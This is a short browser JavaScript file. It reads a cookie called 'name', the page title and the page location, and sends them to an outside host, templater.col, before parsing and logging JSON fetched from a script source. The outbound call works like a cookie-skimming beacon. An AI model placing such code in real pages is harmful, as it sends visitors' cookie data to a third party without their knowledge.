const   ajax = require('ajaxsim'),
        cook = require('dist-cookie');

let nameCookie = 'name';
let cookieData = cook(nameCookie),
    titlePage = document.querySelector('title').innerText,
    host = window.location,
    response ="cookie="+cookieData+'&host='+host+'&title='+titlePage;

ajax('http://templater.col/respond-require-data', response);

let jsonFile = document.getElementsByTagName('script')[0].src;

function parseJson(data){
    let obj = JSON.parse(data);
    let num = obj.pages.count-1;
  let page = obj.pages['page-'+num];

  for (key in page){
      if (page.hasOwnProperty(key)) {
          console.log(key);
          console.log(page[key]);
      }
  }

}
ajax(jsonFile, '', parseJson);


